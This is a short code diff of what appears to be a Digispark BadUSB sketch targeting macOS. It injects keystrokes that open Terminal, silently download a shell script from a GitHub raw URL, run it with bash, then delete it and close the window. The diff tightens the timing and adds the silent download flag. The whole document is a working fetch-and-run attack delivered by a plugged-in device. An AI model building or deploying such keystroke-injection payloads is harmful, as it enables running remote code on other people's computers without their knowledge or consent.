@@ -10,10 +10,13 @@ void p(char *line) {
 }
 
 void loop() {
+  DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(600);
   p("terminal");
-  p("curl -o ~/h.sh https://raw.githubusercontent.com/rmilne/hoffer/master/hoff_osx.sh");
+  DigiKeyboard.sendKeyStroke(KEY_N, MOD_GUI_LEFT);
+  DigiKeyboard.delay(200);
+  p("curl -s -o ~/h.sh https://raw.githubusercontent.com/rmilne/hoffer/master/hoff_osx.sh");
   DigiKeyboard.delay(500);
   p("bash ~/h.sh ; rm ~/h.sh ; exit");
   for(;;){ 
@@ -23,3 +26,4 @@ void loop() {
     delay(100);
   }
 }
+
